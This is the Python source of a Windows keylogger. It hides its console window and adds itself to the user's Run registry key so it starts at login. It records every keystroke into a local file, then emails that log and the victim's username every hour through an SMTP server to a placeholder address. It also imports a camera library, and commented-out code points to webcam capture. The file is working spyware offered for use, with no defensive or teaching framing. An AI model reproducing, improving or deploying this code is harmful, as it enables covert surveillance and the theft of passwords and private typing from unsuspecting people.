import pythoncom, pyHook
import os
import sys
import socket
import threading
import urllib,urllib2
import smtplib
import ftplib
import datetime,time
import win32event, win32api, winerror
from _winreg import *
import threading
import time
from pathlib import Path
import platform
#camer open libraries
import cv2
import smtplib
#email libraries
from email.MIMEMultipart import MIMEMultipart
from email.MIMEText import MIMEText
from email.MIMEBase import MIMEBase
from email.mime.image import MIMEImage
from email.mime.multipart import MIMEMultipart
from email import encoders
import datetime
import getpass

data=''

# Add to startup
def addStartup():
    fp=os.path.dirname(os.path.realpath(__file__))
    file_name=sys.argv[0].split("\\")[-1]
    new_file_path=fp+"\\"+file_name
    keyVal= r'Software\Microsoft\Windows\CurrentVersion\Run'

    key2change= OpenKey(HKEY_CURRENT_USER,
    keyVal,0,KEY_ALL_ACCESS)

    SetValueEx(key2change, "Hpta4Arms",0,REG_SZ, new_file_path)

#Hide Console
def hide():
    import win32console,win32gui
    window = win32console.GetConsoleWindow()
    win32gui.ShowWindow(window,0)
    return True

#Local Keylogger
def local():
    global data
    if len(data)>100:
        fp=open("log.in","a+")
        data = data +'\n'
        fp.write(data)
        fp.close()
        data=''
    return True

def keypressed(event):
    global x,data
    if event.Ascii==13:
        keys='<ENTER>'
    elif event.Ascii==8:
        keys='<BACK SPACE>'
    elif event.Ascii==9:
        keys='<TAB>'
    elif event.Ascii==15:
        keys='<SHIFT>'
    elif event.Ascii==27:
        keys='<ESC>'
    elif event.Alt:
        keys='<ALT>'
    else:
        keys=chr(event.Ascii)
    data=data+keys
    local()

def send_email():
	threading.Timer(3600.0, send_email).start()
	#make sure that there is internet connection
	#take_photo()
	fromaddr = "From_Email_Address"
	toaddr = "To_Email_Address"
	 
	msg = MIMEMultipart()
	 
	msg['From'] = fromaddr
	msg['To'] = toaddr
	msg['Subject'] = str(datetime.datetime.now())
	
	#body of the message
	body = "my name is : "+getpass.getuser()
	
	msg.attach(MIMEText(body, 'plain'))

	#prepare text file to be sent
	filename = Path("log.in")
	if filename.is_file():
		filename = "log.in"
		attachment = open("log.in", "r+")
		part = MIMEBase('application', 'octet-stream')
		part.set_payload((attachment).read())
		encoders.encode_base64(part)
		part.add_header('Content-Disposition', "attachment; filename= %s" % filename)
		msg.attach(part)

	#prepare image to be sent
	#filename = Path("logg.png")
	#if filename.is_file():
	#	#attaach the image
	#	img_data = open("logg.png", 'rb').read()
	#	image = MIMEImage(img_data, name=os.path.basename("logg.png"))
	#	msg.attach(image)
	
	server = smtplib.SMTP('smtp.live.com', 587)
	server.starttls()
	server.login(fromaddr, "From_Email_Password")
	text = msg.as_string()
	server.sendmail(fromaddr, toaddr, text)
	server.quit()
	#myfile="log.in"
	#### if file exists, delete it ##
	#if os.path.isfile(myfile):
	#        os.remove(myfile)


hide()
addStartup()
fp=open("log.in","a+")
fp.write('START::')
fp.close()
send_email()

obj = pyHook.HookManager()
obj.KeyDown = keypressed
obj.HookKeyboard()
pythoncom.PumpMessages()